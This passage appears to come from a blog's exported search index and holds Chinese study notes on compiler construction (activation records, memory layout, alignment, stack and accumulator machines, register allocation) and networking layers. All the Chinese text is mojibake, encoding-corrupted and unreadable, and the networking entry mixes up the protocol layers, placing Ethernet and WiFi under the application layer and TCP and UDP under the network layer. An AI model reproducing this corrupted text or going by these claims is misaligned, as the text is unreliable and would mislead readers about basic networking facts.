&#123;<br>    <span class="hljs-function"><span class="hljs-title">g</span>() : <span class="hljs-variable">Int</span> &#123; <span class="hljs-number">1</span> &#125;;</span><br><span class="hljs-function">    <span class="hljs-title">f</span>(<span class="hljs-variable">x</span>:<span class="hljs-variable">Int</span>): <span class="hljs-variable">Int</span> &#123; <span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">x</span> = <span class="hljs-number">0</span> <span class="hljs-variable">then</span> <span class="hljs-title">g</span>() <span class="hljs-variable"><span class="hljs-keyword">else</span></span> <span class="hljs-title">f</span>(<span class="hljs-variable">x</span> - <span class="hljs-number">1</span>) <span class="hljs-variable">fi</span>&#125;; </span><br><span class="hljs-function">    <span class="hljs-title">main</span>(): <span class="hljs-variable">Int</span> &#123;&#123;<span class="hljs-title">f</span>(<span class="hljs-number">3</span>); &#125;&#125;;</span><br><span class="hljs-function">&#125;</span><br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šä»£ç ç”Ÿæˆçš„æ¿€æ´»è®°å½•å¦‚ä¸‹ï¼š</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">main -&gt; f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">3</span>)</span> -&gt;</span> f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">2</span>)</span> -&gt;</span> f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">1</span>)</span> -&gt;</span> f<span class="hljs-function"><span class="hljs-params">(<span class="hljs-number">0</span>)</span> -&gt;</span> g<br></code></pre></td></tr></table></figure><p>åŸºäºæ­¤ï¼Œå› æ­¤å †æ ˆå¯ä»¥è·Ÿè¸ªæ•´ä¸ªæ¿€æ´»è®°å½•çš„è¿‡ç¨‹</p><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week6%20P1/2021042404.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p><strong>æ¿€æ´»è®°å½•ï¼ˆæ ˆzhenï¼‰</strong></p><p>ç®¡ç†ä¸€ä¸ªè¿‡ç¨‹æ¿€æ´»æ‰€éœ€çš„ä¿¡æ¯ç§°ä¸ºæ¿€æ´»è®°å½•ï¼ˆARï¼‰æˆ–æ ˆå¸§ï¼ˆframeï¼‰</p><p>å¦‚æœè¿‡ç¨‹Fè°ƒç”¨Gï¼Œåˆ™Gçš„æ¿€æ´»è®°å½•åŒ…å«Få’ŒGçš„æ··åˆä¿¡æ¯ã€‚</p><ul><li>Fè¢«â€œæš‚åœâ€ï¼Œç›´åˆ°Gå®Œæˆï¼Œæ­¤æ—¶Fæ¢å¤ã€‚</li><li>Gçš„ARåŒ…å«å¦‚ä¸‹å†…å®¹æ‰€éœ€çš„ä¿¡æ¯<ul><li>å®ŒæˆGçš„æ‰§è¡Œ</li><li>æ¢å¤æ‰§è¡ŒF</li><li>Gè¿”å›å€¼çš„ç©ºé—´</li><li>å®é™…å‚æ•°</li><li>æŒ‡å‘ä¸Šä¸€ä¸ªæ¿€æ´»è®°å½•çš„æŒ‡é’ˆ<ul><li>æ§åˆ¶é“¾æ¥ï¼› æŒ‡å‘Gçš„callerçš„AR</li></ul></li><li>è°ƒç”¨Gä¹‹å‰çš„æœºå™¨çŠ¶æ€<ul><li>å¯„å­˜å™¨å’Œç¨‹åºè®¡æ•°å™¨çš„å†…å®¹</li><li>å±€éƒ¨å˜é‡</li></ul></li><li>å…¶ä»–ä¸´æ—¶å€¼</li></ul></li><li>å°†è¿”å›å€¼æ”¾åœ¨ç¬¬ä¸€ä¸ªæ ˆå¸§ä¸­çš„ä¼˜ç‚¹æ˜¯ï¼Œè°ƒç”¨æ–¹å¯ä»¥åœ¨ä¸è‡ªå·±çš„å¸§ç›¸è·å›ºå®šåç§»é‡çš„ä½ç½®æ‰¾åˆ°å®ƒï¼›</li><li>è¿™ä¸ªç»„ç»‡æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šçš„åœ°æ–¹<ul><li>å¯ä»¥é‡æ–°æ’åˆ—æ ˆå¸§å…ƒç´ çš„é¡ºåºï¼›</li><li>å¯ä»¥ä¸åŒåœ°åˆ’åˆ†caller/callçš„èŒè´£ï¼›</li><li>å¦‚æœç»„ç»‡èƒ½å¤Ÿæé«˜æ‰§è¡Œé€Ÿåº¦æˆ–ç®€åŒ–ä»£ç ç”Ÿæˆï¼Œé‚£ä¹ˆå®ƒä¼šæ›´å¥½ã€‚</li></ul></li><li>çœŸæ­£çš„ç¼–è¯‘å™¨å°†å°½å¯èƒ½å¤šçš„æ ˆå¸§ä¿å­˜åœ¨å¯„å­˜å™¨ä¸­<ul><li>ç‰¹åˆ«æ˜¯æ–¹æ³•çš„ç»“æœå’Œå‚æ•°ã€‚</li></ul></li><li>ç¼–è¯‘å™¨å¿…é¡»åœ¨ç¼–è¯‘æ—¶ç¡®å®šæ¿€æ´»è®°å½•çš„å¸ƒå±€ï¼Œå¹¶ç”Ÿæˆå¯æ­£ç¡®è®¿é—®æ¿€æ´»è®°å½•ä¸­ä½ç½®çš„ä»£ç ã€‚</li><li>å› æ­¤ï¼ŒARå¸ƒå±€å’Œä»£ç ç”Ÿæˆå™¨å¿…é¡»ä¸€èµ·è®¾è®¡ï¼</li></ul><h2 id="å…¨å±€å˜é‡å’Œå †">å…¨å±€å˜é‡å’Œå †</h2><ul><li>æ‰€æœ‰å¯¹å…¨å±€å˜é‡çš„å¼•ç”¨éƒ½æŒ‡å‘åŒä¸€ä¸ªå¯¹è±¡<ul><li>æ‰€ä»¥æ— æ³•åœ¨æ¿€æ´»è®°å½•ä¸­å­˜å‚¨å…¨å±€å˜é‡ï¼Œå› ä¸ºå½“å‰ARç»“æŸåï¼Œå…¨å±€å˜é‡ä¾æ—§å­˜åœ¨</li></ul></li><li>å› æ­¤éœ€è¦ä¸ºå…¨å±€å˜é‡åˆ†é…ä¸€æ¬¡å›ºå®šåœ°å€<ul><li>å…·æœ‰å›ºå®šåœ°å€çš„å˜é‡æ˜¯â€œé™æ€åˆ†é…çš„â€ã€‚</li></ul></li><li>æ ¹æ®è¯­è¨€ï¼Œå¯èƒ½è¿˜æœ‰å…¶ä»–é™æ€åˆ†é…çš„å€¼</li></ul><p>åŠ¨æ€åˆ†é…çš„å€¼ä¸èƒ½å­˜æ”¾åœ¨ARä¸­ï¼ŒBarå€¼å¿…é¡»åœ¨fooçš„ARé‡Šæ”¾åä¾ç„¶å­˜åœ¨ï¼Œå› ä¸ºfooçš„è°ƒç”¨è€…å¯èƒ½ä½¿ç”¨Barã€‚ï¼š</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-keyword">method</span> <span class="hljs-title function_">foo</span><span class="hljs-params">()</span> <span class="hljs-comment">&#123; new Bar &#125;</span><br></code></pre></td></tr></table></figure><ul><li>å…·æœ‰åŠ¨æ€åˆ†é…æ•°æ®çš„è¯­è¨€ä½¿ç”¨å †æ¥å­˜å‚¨åŠ¨æ€æ•°æ®ã€‚</li><li>ä»£ç åŒºåŸŸåŒ…å«ç›®æ ‡ä»£ç <ul><li>å¯¹äºè®¸å¤šè¯­è¨€ï¼Œç›®æ ‡ä»£ç æ˜¯å›ºå®šå¤§å°å’Œåªè¯»çš„ã€‚</li></ul></li><li>é™æ€åŒºåŸŸåŒ…å«å…·æœ‰å›ºå®šåœ°å€çš„æ•°æ®ï¼ˆéä»£ç ï¼‰ï¼ˆä¾‹å¦‚ï¼Œå…¨å±€æ•°æ®ï¼‰<ul><li>å›ºå®šå¤§å°ï¼Œå¯èƒ½æ˜¯å¯è¯»æˆ–å¯å†™çš„ã€‚</li></ul></li><li>å †æ ˆåŒ…å«æ¯ä¸ªå½“å‰æ´»åŠ¨è¿‡ç¨‹çš„AR<ul><li><strong>æ¯ä¸ªARé€šå¸¸å›ºå®šå¤§å°ï¼Œå¹¶ä¸”åŒ…å«å±€éƒ¨å˜é‡ã€‚</strong></li></ul></li><li>å †åŒ…å«æ‰€æœ‰å…¶ä»–æ•°æ®<ul><li>åœ¨Cä¸­ï¼Œå †ç”±mallocå’Œfreeç®¡ç†ã€‚</li></ul></li><li>å †å’Œå †æ ˆéƒ½ä¼šå¢é•¿</li><li>å¿…é¡»æ³¨æ„ä¸è¦äº’ç›¸å½±å“</li><li>è§£å†³æ–¹æ¡ˆï¼š<ul><li>å°†å †å’Œå †æ ˆé¡¶åœ¨å†…å­˜çš„ä¸¤ç«¯ï¼Œç„¶åè®©å®ƒä»¬å½¼æ­¤é è¿‘ï¼š</li></ul></li></ul><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week6%20P1/2021042410.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="å¯¹é½">å¯¹é½</h2><p>å¤§å¤šæ•°ç°ä»£æœºå™¨ï¼š32/64 bit</p><p>1 byte = 8 bits</p><p>1 word = 4 or 8 bytes</p><p>ä¸€èˆ¬æœºå™¨è¦ä¹ˆæ˜¯æŒ‰å­—èŠ‚è¦ä¹ˆæŒ‰å­—å¯»å€</p><p>æŒ‰å­—å¯¹é½ï¼š</p><p>exampleï¼š</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs axapta">[h e l l o ? ? ?][<span class="hljs-keyword">next</span> data]<br>add <span class="hljs-number">3</span> padding characters to the string<br><br>[<span class="hljs-built_in">byte</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">byte</span> <span class="hljs-built_in">byte</span> ?    ?   ?]<br><span class="hljs-keyword">this</span>, word aligned <span class="hljs-keyword">if</span> <span class="hljs-keyword">next</span> data begin <span class="hljs-keyword">from</span> here,<br>      <span class="hljs-keyword">this</span>, not word aligned <span class="hljs-keyword">if</span> <span class="hljs-keyword">next</span> data begin <span class="hljs-keyword">from</span> here,<br></code></pre></td></tr></table></figure><h2 id="è®¡ç®—æ¨¡å‹å †æ ˆæœºå¯„å­˜å™¨">è®¡ç®—æ¨¡å‹ï¼šå †æ ˆæœº&amp;å¯„å­˜å™¨&amp;</h2><p>å †æ ˆæœºå”¯ä¸€çš„å­˜å‚¨å°±æ˜¯å †æ ˆ</p><ul><li>æŒ‡ä»¤ $ r = F(a_1, a_2, ..., a_n) $<ul><li>ä»å †æ ˆä¸­å¼¹å‡ºnä¸ªæ“ä½œæ•°</li><li>ä½¿ç”¨æ“ä½œæ•°è®¡ç®—æ“ä½œF</li><li>å°†ç»“æœrå‹å…¥å †æ ˆ</li></ul></li><li>è€ƒè™‘å¦‚ä¸‹ä¸¤æ¡æŒ‡ä»¤<ul><li>push i: å°†æ•´æ•°iå †å…¥å †æ ˆ</li><li>add: ç›¸åŠ ä¸¤ä¸ªæ•´æ•°</li></ul></li></ul><p>ğŸŒ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs none">push 1<br>push 2<br>push 3<br>add<br></code></pre></td></tr></table></figure><figure><imgsrc="https://upload-images.jianshu.io/upload_images/18574033-6cbe4fae0a21d2f2.gif?imageMogr2/auto-orient/strip%7CimageView2/2/w/1090/format/webp"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>ç´¯åŠ å™¨æœºï¼Œè‹±æ–‡ä¸ºâ€œAccumulatorMachineâ€ï¼Œæ˜¯ä¸€ç§å¯„å­˜å™¨ï¼Œç”¨æ¥å­˜å‚¨è®¡ç®—äº§ç”Ÿçš„ä¸­é—´ç»“æœã€‚ç´¯åŠ å™¨æœºæ¨¡å‹æ˜¯ä¸€ç§å¤è€çš„è®¡ç®—æ¨¡å‹ï¼Œä»…èƒ½å¤Ÿæ”¯æŒå•ä¸€å€¼çš„ç´¯åŠ å¯„å­˜å™¨å•å…ƒï¼Œå› æ­¤ï¼ŒåŸºäºç´¯åŠ å™¨æœºæ¨¡å‹è®¾è®¡çš„æŒ‡ä»¤éƒ½åªæ”¯æŒä¸€ä¸ªæ“ä½œæ•°</p><p>å¯„å­˜å™¨æœºï¼Œè‹±æ–‡ä¸º RegisterMachineï¼Œä¹Ÿè¯‘ä¸ºæš‚å­˜å™¨æœºï¼Œè¿™ç§è®¡ç®—æ¨¡å‹çš„æœºå™¨ï¼Œä½¿ç”¨ç‰¹å®šçš„ CPUå¯„å­˜å™¨ç»„ï¼Œæ¥ä½œä¸ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ä¸­æ•°æ®å­˜å‚¨å’Œäº¤æ¢çš„å®¹å™¨ã€‚</p><p>åœ¨å¯„å­˜å™¨ä¸­ï¼Œç”±äºæ¯ä¸€æ¡å‚ä¸åˆ°æ•°æ®äº¤æ¢å’Œå¤„ç†çš„æŒ‡ä»¤ï¼Œéƒ½éœ€è¦æ˜¾ç¤ºåœ°æ ‡è®°æ“ä½œæ•°æ‰€åœ¨çš„å¯„å­˜å™¨ï¼Œç›¸è¾ƒäºå †æ ˆæœºå’Œç´¯åŠ å™¨æœºï¼ŒæŒ‡ä»¤æ›´é•¿ï¼Œä½†ä¹Ÿæ›´åŠ çµæ´»ã€‚</p><p>å †æ ˆæœºä½¿ç”¨æ ˆç»“æ„ä½œä¸ºæ•°æ®å­˜å‚¨ä¸äº¤æ¢çš„å®¹å™¨ï¼Œç”±äºå…¶â€œå…ˆè¿›åå‡ºâ€çš„ç‰¹æ€§ï¼Œæ— æ³•ç›´æ¥æ“ä½œä½äºæ ˆåº•çš„æ•°æ®ï¼Œå› æ­¤ï¼Œåœ¨ç‰¹æ®Šæƒ…å†µä¸‹ï¼Œæœºå™¨ä¼šä½¿ç”¨é¢å¤–çš„æŒ‡ä»¤æ¥è¿›è¡Œæ ˆæ•°æ®çš„äº¤æ¢è¿‡ç¨‹ï¼Œä»è€ŒæŸå¤±ä¸€å®šçš„æ‰§è¡Œæ•ˆç‡ã€‚ä½†å¦ä¸€æ–¹é¢ï¼Œå †æ ˆæœºæ¨¡å‹å®ç°ç®€å•ï¼ŒæŒ‡ä»¤ä»£ç é•¿åº¦é€‚ä¸­ã€‚</p><p>ç´¯åŠ å™¨æœºç”±äºåªæœ‰ä¸€ä¸ªç´¯åŠ å™¨å¯„å­˜å™¨å¯ç”¨äºå­˜å‚¨æ•°æ®ï¼Œå› æ­¤åœ¨æŒ‡ä»¤çš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¼šé¢‘ç¹è¯·æ±‚æœºå™¨çš„çº¿å½¢å†…å­˜ï¼Œä»è€Œå¯¼è‡´ä¸€å®šçš„æ€§èƒ½æŸè€—ã€‚ä½†å¦ä¸€æ–¹é¢ï¼Œè¯¥æ¨¡å‹æœ€å¤šåªèƒ½æœ‰ä¸€ä¸ªæ“ä½œæ•°ï¼Œå› æ­¤å¯¹åº”çš„æŒ‡ä»¤ä»£ç è¾ƒä¸ºç²¾ç®€ã€‚</p><p>å¯„å­˜å™¨æœºå†…å¤§å¤šæ•°ä¸æ•°æ®æ“ä½œç›¸å…³çš„æŒ‡ä»¤ï¼Œéƒ½éœ€è¦åœ¨æ‰§è¡Œæ—¶æŒ‡å®šç›®æ ‡å¯„å­˜å™¨ï¼Œå› æ­¤ï¼ŒæŒ‡ä»¤ä»£ç çš„é•¿åº¦è¾ƒé•¿ã€‚å¯„å­˜å™¨æœºæ‹¥æœ‰æ›´å¤šçš„æ•°æ®æš‚å­˜å®¹å™¨ï¼Œä¸€æ–¹é¢ï¼Œçµæ´»çš„æ•°æ®æ“ä½œå¯¼è‡´å¯„å­˜å™¨çš„åˆ†é…å’Œä½¿ç”¨è§„åˆ™å˜å¾—å¤æ‚ï¼Œå¦ä¸€æ–¹é¢ï¼Œåœ¨ä½¿ç”¨å¾—å½“çš„æƒ…å†µä¸‹ï¼ŒåŒæ ·çš„è®¡ç®—é€»è¾‘ï¼ŒåŸºäºå¯„å­˜å™¨æœºæ¨¡å‹ï¼Œå¯ä»¥ç”Ÿæˆæ›´ä¸ºé«˜æ•ˆçš„æŒ‡ä»¤æ‰§è¡Œç»“æ„ã€‚</p><p>çº¯å †æ ˆæœºå’Œçº¯å¯„å­˜å™¨æœºä¹‹é—´æœ‰ä¸€ä¸ªä¸­é—´ç‚¹ï¼šnå¯„å­˜å™¨å †æ ˆæœº</p><p>ä»æ¦‚å¿µä¸Šè®²ï¼Œå°†çº¯å †æ ˆæœºå †æ ˆçš„å‰nä¸ªä½ç½®ä¿ç•™åœ¨å¯„å­˜å™¨ä¸­ã€‚å½“n=1çš„æ—¶å€™ï¼Œè¯¥å¯„å­˜å™¨æ¼”å˜æˆäº†ç´¯åŠ å™¨æœº</p><ul><li><p>åœ¨çº¯å †æ ˆæœºä¸­</p><ul><li>ä¸€æ¬¡addæ‰§è¡Œä¸‰æ¬¡å†…å­˜æ“ä½œï¼›</li><li>ä¸¤æ¬¡è¯»å–ï¼Œä¸€æ¬¡å†™å…¥å †æ ˆã€‚</li></ul></li><li><p>åœ¨1å¯„å­˜å™¨å †æ ˆè®¡ç®—æœºä¸­ï¼Œaddè¿ç®—ç¬¦åªè¦ä½¿ç”¨å¦‚ä¸‹æ–¹å¼å³å¯ï¼š</p><ul><li>acc &lt;- acc + top_of_stackï¼Œaccå³ç´¯åŠ å™¨å¯„å­˜å™¨</li></ul></li><li><p>è€ƒè™‘ä¸€ä¸ªè¡¨è¾¾å¼op(e1,â€¦,en)</p><ul><li>æ³¨æ„e1,â€¦,enæ˜¯å­è¡¨è¾¾å¼ã€‚</li><li>å¯¹äºæ¯ä¸ªei(0&lt;i&lt;n)<ul><li>è®¡ç®—eiï¼›</li><li>å°†ç»“æœå‹å…¥å †æ ˆã€‚</li></ul></li><li>ä»å †æ ˆä¸­å¼¹å‡ºnâˆ’1ä¸ªå€¼ï¼Œè®¡ç®—op</li><li>å°†ç»“æœå­˜å‚¨åœ¨ç´¯åŠ å™¨ä¸­ã€‚</li></ul></li><li><p>å¯¹è¡¨è¾¾å¼eæ±‚å€¼åï¼Œç´¯åŠ å™¨å°†ä¿ç•™eçš„å€¼ï¼Œå¹¶ä¸”å †æ ˆå‰©ä½™éƒ¨åˆ†ä¸å˜ã€‚</p></li></ul><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week6%20P1/2021042413.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>ç¼–è¯‘åŸç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–è¯‘åŸç†ï¼Œè®¡ç®—æœºåŸºç¡€ï¼Œcool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/emocoder/2023/06/03/%E5%9B%9B%E5%B1%82%EF%BC%9A%E6%AF%8F%E4%B8%80%E5%B1%82%E9%83%BD%E4%B8%BA%E4%B8%8A%E5%B1%82%E6%8F%90%E4%BE%9B%E4%BA%86%E6%9C%8D%E5%8A%A1/"/>
    <url>/emocoder/2023/06/03/%E5%9B%9B%E5%B1%82%EF%BC%9A%E6%AF%8F%E4%B8%80%E5%B1%82%E9%83%BD%E4%B8%BA%E4%B8%8A%E5%B1%82%E6%8F%90%E4%BE%9B%E4%BA%86%E6%9C%8D%E5%8A%A1/</url>
    
    <content type="html"><![CDATA[<p>å››å±‚ï¼šæ¯ä¸€å±‚éƒ½ä¸ºä¸Šå±‚æä¾›äº†æœåŠ¡</p><p>Applicationï¼šåŒå‘å¯é çš„å­—èŠ‚æµ(using application-specificsemantics)</p><p>Transport: ä¿è¯äº†æ•°æ®æ­£ç¡®ï¼Œæœ‰åºï¼Œä»¥åŠæ‹¥å¡æ§åˆ¶</p><p>Network: ä¸èƒ½ä¿è¯æ•°æ®çš„æœ‰åºæ­£ç¡®ï¼Œä¸æŸåï¼Œfrom ,to</p><p>Link: èŠ‚ç‚¹ä¹‹é—´çš„æ•°æ®ä¼ æ’­</p><p>IPï¼šç˜¦èº«å±‚ï¼Œå› ä¸ºåº•å±‚å¯ä»¥æœ‰å¾ˆå¤šï¼ˆhttp, smtp, ssh,ftpï¼‰ï¼Œä¸Šå±‚ä¹Ÿæ˜¯ï¼Œæ¯”å¦‚ç½‘ç»œå±‚ï¼ˆtcp, rtp, udpï¼‰ï¼Œåº”ç”¨å±‚ï¼ˆethernet, wifi,dsl, sgï¼‰,ä½†æ˜¯ç½‘ç»œå±‚åªæœ‰ä¸€ç§åè®®: IP</p><p>OSI7å±‚æ ‡å‡†</p><p>ç½‘ç»œå±‚ï¼ˆæœ€é‡è¦ï¼‰ï¼šä¸»è¦æ˜¯Internet protocolï¼ˆIPï¼‰</p><p><strong>è·¯ç”±å™¨ï¼š</strong></p><p>æ¯ä¸ªç«¯å£éƒ½æœ‰è‡ªå·±çš„macåœ°å€</p><p>å…·æœ‰å­˜å‚¨å±€éƒ¨è·¯ç”±çš„åŠŸèƒ½</p><p>å…·æœ‰è½¬å‘æ•°æ®åŒ…çš„åŠŸèƒ½</p><p><strong>äº¤æ¢æœºï¼š</strong></p><p>æ²¡æœ‰macåœ°å€</p><p>åªèƒ½å­˜å‚¨å…¨å±€çš„macæ˜ å°„è¡¨ï¼Œéšç€ç½‘ç»œçš„æ¥å…¥ï¼Œä¼šè¶Šæ¥è¶Šå¤§</p><p>å¯ä»¥æ ¹æ®macæ˜ å°„è¡¨ï¼Œè½¬å‘ç»™æŒ‡å®šä¸»æœº</p><p><strong>é›†çº¿å™¨ï¼š</strong></p><p>ä¸ºäº†è§£å†³åªæœ‰ç”µè„‘çš„ç®€å•ç½‘ç»œæ—¶ä»£çš„äº’è”ç½‘ä¹‹é—´çš„è¿æ¥é—®é¢˜</p><p>æ²¡æœ‰macåœ°å€ï¼Œ</p><p>æ²¡æœ‰å­˜å‚¨ä»»ä½•è¡¨</p><p>ä»…ä»…é€šè¿‡å¹¿æ’­å¯»æ‰¾ç›®çš„åœ°å€</p><p><ahref="https://blog.csdn.net/qq_44807642/article/details/103054914">(306æ¡æ¶ˆæ¯)ã€åŠ¨å›¾è®²è§£ã€‘è®¡ç®—æœºç½‘ç»œä¹‹å›é€€Næ­¥ä¸é€‰æ‹©é‡ä¼ _é€‰æ‹©é‡ä¼ å’Œå›é€€næ­¥_å²³éº“å±±ä¸‹ä½ å’Œæˆ‘çš„åšå®¢-CSDNåšå®¢</a></p><p>â€‹</p><ul><li>Introduction<ul><li>å¼•è¨€</li><li>ç½‘ç»œä¸­çš„è®¾è®¡æ¨¡å¼</li><li>å­—èŠ‚é¡ºåº</li><li>IPv4</li><li>æœ€é•¿å‰ç¼€åŒ¹é…</li><li>åœ°å€è§£æåè®®</li><li>æ€»ç»“</li></ul></li><li>ä¼ è¾“å±‚åè®®<ul><li>TCP</li><li>UDP</li><li>ç«¯åˆ°ç«¯åŸåˆ™</li><li>é”™è¯¯æ£€æµ‹</li><li>ç½‘ç»œä¸­çš„ç¡®å®šæ€§æœ‰é™çŠ¶æ€æœº</li><li>åœæ­¢ç­‰å¾…åè®®</li><li>æ»‘åŠ¨çª—å£</li><li>å¯é ç­–ç•¥ä¸€(é‡ä¼ )</li><li>å¯é ç­–ç•¥äºŒ(TCPh header)</li><li>å¯é ç­–ç•¥ä¸€(è¿æ¥ä¸æ‹†å¸)</li><li>æ€»ç»“</li></ul></li><li>åˆ†ç»„äº¤æ¢</li><li>æ‹¥å¡æ§åˆ¶</li><li>åº”ç”¨å±‚åè®®</li><li>è·¯ç”±</li><li>ç‰©ç†å±‚åè®®</li><li>ç½‘ç½‘ç»œå®‰å…¨ä¸åŠ å¯†</li><li>å‰æ²¿è¯é¢˜</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ–¯å¦ç¦cs231(ç¼–è¯‘åŸç†)ã® 10 Register Allocation</title>
    <link href="/emocoder/2023/05/20/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81/"/>
    <url>/emocoder/2023/05/20/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%8D%81/</url>
    
    <content type="html"><![CDATA[<h2 id="å¼•å…¥">å¼•å…¥</h2><p>ä¸­é—´ä»£ç ä½¿ç”¨äº†æ— é™åˆ¶çš„ä¸´æ—¶å˜é‡</p><ul><li>ç®€åŒ–äº†ä»£ç ç”Ÿæˆå’Œä¼˜åŒ–</li><li>å¤æ‚äº†å‘æ±‡ç¼–è½¬æ¢çš„è¿‡ç¨‹</li></ul><p>å®é™…æƒ…å†µå¯„å­˜å™¨æ˜¯æœ‰é™çš„ï¼Œä¸èƒ½æ— é™åˆ¶çš„ä½¿ç”¨ï¼Œæ‰€ä»¥åœ¨å‘æ±‡ç¼–è½¬æ¢çš„æ—¶å€™ä½¿ç”¨æœ‰é™çš„å¯„å­˜å™¨ã€‚</p><blockquote><p>Register allocation is as old as compilers</p><ul><li>Register allocation was used in the original FORTRAN compiler in theâ€˜50s</li><li>Very crude algorithms</li></ul><p>A breakthrough came in 1980 â€“ Register allocation scheme based ongraph coloring â€“ Relatively simple, global and works well inpractice</p></blockquote><p><strong>æ€è·¯ï¼š</strong></p><ul><li>å°†å¤šä¸ªä¸´æ—¶å˜é‡åˆ†é…ç»™åŒä¸€ä¸ªå¯„å­˜å™¨</li><li>åŒæ—¶ä¸æ”¹å˜åŸæ¥çš„è¯­ä¹‰</li></ul><p>è€ƒè™‘å¦‚ä¸‹ç¨‹åºï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-tag">a</span> := c + d<br>e := <span class="hljs-selector-tag">a</span> + <span class="hljs-selector-tag">b</span><br>f : = e - <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>å¦‚æœä»…ä»…ä½¿ç”¨ä¸‰ä¸ªå¯„å­˜å™¨çš„è¯ï¼Œè¿™é‡Œå‡è®¾aå’Œeåœ¨ä½¿ç”¨å®Œä¹‹åç«‹é©¬deadï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-built_in">r1</span> := <span class="hljs-built_in">r2</span> + <span class="hljs-built_in">r3</span><br><span class="hljs-built_in">r1</span> := <span class="hljs-built_in">r1</span> + <span class="hljs-built_in">r4</span><br><span class="hljs-built_in">r1</span> := <span class="hljs-built_in">r1</span> - <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>ç»™ä¼—å¤šçš„ä¸´æ—¶å˜é‡åˆ†é…æœ‰é™çš„å¯„å­˜å™¨å¹¶ä¸”ç›¸äº’ä¸å†²çªè¿™æ˜¯é‡ä¸­ä¹‹é‡ï¼š</p><ul><li>å¦‚æœåœ¨ç¨‹åºåœ¨æŸä¸ªè¿è¡Œç‚¹ä¸´æ—¶å˜é‡t1å’Œt2ä¸åŒæ—¶å­˜æ´»ï¼Œé‚£ä¹ˆt1å’Œt2å¯ä»¥å…±äº«ç›¸åŒçš„å¯„å­˜å™¨</li><li>å¦åˆ™ï¼Œt1å’Œt2ä¸èƒ½åŒæ—¶åˆ†é…ç»™ä¸€ä¸ªå¯„å­˜å™¨</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520152040397.png"alt="image-20230520152040397" /><figcaption aria-hidden="true">image-20230520152040397</figcaption></figure><p>åŸºäºä¹‹é—´çš„æ´»è·ƒå˜é‡åˆ†ææ„å»ºæ— å‘å›¾(å¯„å­˜å™¨å¹²æ‰°å›¾, RIG)ï¼š</p><ul><li>èŠ‚ç‚¹æ˜¯ä¸´æ—¶å˜é‡</li><li>è¾¹è¡¨ç¤ºè¿™ä¸¤ä¸ªèŠ‚ç‚¹å¯¹åº”çš„å˜é‡åŒæ—¶åœ¨æŸä¸ªæ—¶åˆ»å­˜æ´»</li><li>å¦‚æœèŠ‚ç‚¹ä¹‹é—´æ²¡æœ‰è¾¹ï¼Œè¯´æ˜èŠ‚ç‚¹å¯ä»¥å…±äº«ä¸€ä¸ªå¯„å­˜å™¨</li></ul><p>å¦‚ä¸‹ï¼š</p><ul><li>ä¾‹å¦‚ï¼Œbå’Œcä¸èƒ½åœ¨åŒä¸€å¯„å­˜å™¨ä¸­</li><li>ä¾‹å¦‚ï¼Œbå’Œdå¯ä»¥åœ¨åŒä¸€å¯„å­˜å™¨ä¸­</li></ul><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week8%20P2/2021050602.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><blockquote><p>RIGæ„å»ºå®Œæˆåï¼Œå¯„å­˜å™¨åˆ†é…ç®—æ³•ä¸ä½“ç³»æ¶æ„æ— å…³ï¼Œä¸ä¾èµ–ä»»ä½•æœºå™¨å±æ€§</p></blockquote><h2 